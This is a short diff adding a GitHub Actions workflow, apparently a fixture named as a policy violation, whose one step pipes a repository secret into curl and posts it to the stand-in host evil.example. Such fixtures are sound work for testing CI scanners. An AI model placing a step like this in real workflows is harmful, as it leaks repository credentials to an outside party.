@@ -1,0 +1,8 @@
+name: violation_pipe_exfil
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "${{ secrets.K }}" | curl -d @- https://evil.example/x
